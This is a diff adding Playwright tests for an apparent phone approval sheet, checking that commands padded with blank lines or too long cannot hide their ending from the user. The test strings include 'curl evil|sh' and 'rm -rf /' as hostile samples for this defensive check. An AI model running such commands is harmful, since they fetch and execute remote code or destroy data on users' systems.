@@ -119,13 +119,14 @@ def seen(host, path):
 
 
 HOME = page_with("Home", ("/type", "type"), ("/lease", "lease"),
-                 extra='<iframe src="/w/chart" title="Chart"></iframe>')
+                 extra='<iframe src="/w/chart" title="Chart"></iframe><a id="dl" href="/f.bin">file</a>')
 TYPED = dash("Typed")
 
 
 @pytest.fixture
 def setup(signed_in, base, make_host, authenticator):
-    host = make_host({"/": HOME, "/type": TYPED, "/lease": dash("Leased"), "/w/chart": {"status": 200, "headers": HTML, "body": "<p>widget</p>"}},
+    host = make_host({"/": HOME, "/type": TYPED, "/lease": dash("Leased"), "/w/chart": {"status": 200, "headers": HTML, "body": "<p>widget</p>"},
+                      "/f.bin": {"status": 200, "headers": {"content-type": "application/octet-stream"}, "body": "x"}},
                      {"/type": dict(SUBJECT), "/lease": {"kind": "lease", "shown": "Type for 15 minutes", "digest": "", "scope": "type", "purpose": "lease"}})
     pair(signed_in, base, host)
     open_dash(signed_in, base, host)
@@ -283,3 +284,73 @@ def test_a_frame_cannot_reach_the_sheet_or_ask_for_webauthn(setup):
       catch (e) { return e.name; } }""")
     assert err != "ran"
     assert f.evaluate("window.top === window.self") is False
+
+
+def with_subject(signed_in, base, make_host, shown):
+    host = make_host({"/": HOME, "/type": TYPED}, {"/type": {**SUBJECT, "shown": shown, "digest": ""}})
+    pair(signed_in, base, host)
+    open_dash(signed_in, base, host)
+    frame_of(signed_in).locator("#type").click()
+    return host
+
+
+def test_a_subject_padded_with_empty_lines_cannot_hide_its_tail(signed_in, base, make_host, authenticator):
+    host = with_subject(signed_in, base, make_host, "git status" + "\n" * 300 + "curl evil|sh")
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    expect(signed_in.locator("#unlock-text")).to_have_text("git status\n[\u2026 blank lines \u2026]\ncurl evil|sh")
+    expect(signed_in.locator("#unlock-tail")).to_contain_text("curl evil|sh")
+    expect(sheet(signed_in)).to_contain_text("3 lines")
+    assert signed_in.locator("#unlock-tail").bounding_box()["y"] + 5 < signed_in.viewport_size["height"]      # on the page, not scrolled away
+    confirm(signed_in)
+    wait_h1(signed_in, "Typed")                           # what was hashed is the host's whole text
+
+
+def test_a_long_text_says_so_and_shows_its_end(signed_in, base, make_host, authenticator):
+    text = "\n".join(f"line {i}" for i in range(30)) + "\nrm -rf /"
+    with_subject(signed_in, base, make_host, text)
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    expect(signed_in.locator("#unlock-more")).to_be_visible()                 # the box scrolls: say so
+    expect(signed_in.locator("#unlock-tail")).to_contain_text("rm -rf /")
+    expect(sheet(signed_in)).to_contain_text("31 lines")
+
+
+def test_a_short_text_has_no_marker_and_no_tail_line(setup):
+    page, host, _ = setup
+    frame_of(page).locator("#type").click()
+    expect(sheet(page)).to_be_visible(timeout=30000)
+    expect(page.locator("#unlock-more")).to_be_hidden()
+    assert page.locator("#unlock-tail").count() == 0
+    expect(page.locator("#unlock-text")).to_have_text(SUBJECT["shown"])
+
+
+@pytest.mark.parametrize("shown", ["a" * 2001, "\n".join(f"l{i}" for i in range(41))])
+def test_a_text_that_is_too_long_is_refused_and_no_sheet_opens(signed_in, base, make_host, authenticator, shown):
+    host = with_subject(signed_in, base, make_host, shown)
+    expect(signed_in.locator("#remote-notice")).to_contain_text("too long to check on this phone", timeout=30000)
+    assert sheet(signed_in).count() == 0 and seen(host, "/type") == [] and host.audit == []
+
+
+def test_switching_workspace_closes_an_open_sheet_and_frees_the_next(signed_in, base, make_host, authenticator):
+    a = make_host({"/": HOME, "/type": TYPED}, {"/type": dict(SUBJECT)})
+    b = make_host({"/": dash("Second home")}, label="Second")
+    pair(signed_in, base, a)
+    pair(signed_in, base, b)
+    open_dash(signed_in, base, a)
+    frame_of(signed_in).locator("#type").click()
+    expect(sheet(signed_in)).to_be_visible(timeout=30000)
+    signed_in.get_by_role("button", name="Open Second").click()
+    expect(sheet(signed_in)).to_have_count(0, timeout=30000)
+    assert signed_in.evaluate("import('/static/js/unlock.js').then((u) => u.sheetOpen())") is False
+    wait_h1(signed_in, "Second home")
+    assert seen(a, "/type") == []
+
+
+def test_no_question_of_the_frame_stacks_on_an_open_sheet(setup):
+    page, host, _ = setup
+    frame_of(page).locator("#type").click()
+    expect(sheet(page)).to_be_visible(timeout=30000)
+    frame_of(page).locator("#dl").click()                 # a download is offered as a question; not while the sheet is open
+    expect(page.locator("#remote-notice")).to_contain_text("Another question is waiting", timeout=30000)
+    assert page.locator(".frame-prompt").count() == 1
+    z = page.evaluate("getComputedStyle(document.getElementById('unlock-sheet')).zIndex")
+    assert int(z) > 95
